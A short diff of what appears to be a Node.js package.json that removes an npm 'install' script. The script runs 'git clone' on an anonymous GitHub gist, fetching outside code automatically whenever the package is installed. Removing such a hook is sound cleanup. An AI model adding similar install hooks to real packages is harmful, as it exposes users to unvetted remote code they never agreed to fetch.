@@ -14,9 +14,6 @@
     "cors":        "latest",
     "ejs":         "latest"
   },
-  "scripts": {
-    "install": "git clone https://gist.github.com/eb425e24cc43fdb167f04cd796376d62.git"
-  },
   "devDependencies": {},
   "repository": {
     "type": "git",
